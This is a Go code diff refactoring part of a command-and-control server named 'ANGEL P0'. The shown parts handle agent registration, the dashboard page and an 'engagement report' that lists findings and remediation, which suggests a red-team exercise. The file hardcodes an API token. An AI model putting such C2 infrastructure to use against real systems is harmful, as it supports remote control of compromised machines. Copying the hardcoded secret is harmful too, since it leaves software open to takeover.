@@ -31,12 +31,11 @@ CreatedAt int64  `json:"created_at"`
 }
 
 var (
-agents       = make(map[string]Agent)
-tasks        = make(map[string][]Task)
-taskID       = 0
-agentsMu     sync.Mutex
-tasksMu      sync.Mutex
-activeAgents = []Agent{}
+agents   = make(map[string]Agent)
+tasks    = make(map[string][]Task)
+taskID   = 0
+agentsMu sync.Mutex
+tasksMu  sync.Mutex
 )
 
 const API_TOKEN = "my-super-secret-token-123"
@@ -149,28 +148,7 @@ return gcm.Open(nil, nonce, ciphertext, nil)
 
 func dashboardHandler(w http.ResponseWriter, r *http.Request) {
 w.Header().Set("Content-Type", "text/html; charset=utf-8")
-fmt.Fprintf(w, `
-<!DOCTYPE html>
-<html>
-<head><title>ANGEL C2 Dashboard</title></head>
-<body>
-<h1>ANGEL P0 C2 Dashboard</h1>
-<p>Status: <b>ACTIVE</b> | Version: <b>ANGEL-P0</b></p>
-<p>Active Agents: %d</p>
-<h2>Registered Agents</h2>
-<ul>
-%s
-</ul>
-</body>
-</html>`, len(activeAgents), generateAgentList())
-}
-
-func generateAgentList() string {
-var result string
-for _, agent := range activeAgents {
-result += fmt.Sprintf("<li>ID: %s | OS: %s | Last Seen: %d</li>", agent.ID, agent.OS, agent.LastSeen)
-}
-return result
+fmt.Fprintf(w, "<!DOCTYPE html><html><head><title>ANGEL C2 Dashboard</title></head><body><h1>ANGEL P0 C2 Dashboard</h1><p>Status: <b>ACTIVE</b> | Version: <b>ANGEL-P0</b></p><p>Active Agents: %d</p></body></html>", len(agents))
 }
 
 func registerHandler(w http.ResponseWriter, r *http.Request) {
@@ -186,7 +164,6 @@ return
 agentsMu.Lock()
 agent.LastSeen = time.Now().Unix()
 agents[agent.ID] = agent
-activeAgents = append(activeAgents, agent)
 agentsMu.Unlock()
 w.Header().Set("Content-Type", "application/json")
 json.NewEncoder(w).Encode(map[string]string{"status": "registered"})
@@ -276,7 +253,7 @@ w.Header().Set("Content-Type", "text/plain")
 fmt.Fprintf(w, "ANGEL P0 C2 Engagement Report\n")
 fmt.Fprintf(w, "============================\n")
 fmt.Fprintf(w, "Generated Time: %s\n\n", time.Now().Format(time.RFC3339))
-fmt.Fprintf(w, "Active Agents: %d\n", len(activeAgents))
+fmt.Fprintf(w, "Active Agents: %d\n", len(agents))
 fmt.Fprintf(w, "Total Tasks Issued: %d\n\n", taskID)
 fmt.Fprintf(w, "--- FINDINGS & REMEDIATION ---\n")
 fmt.Fprintf(w, "1. Command Injection (RCE): Whitelist input & disable exec.\n")
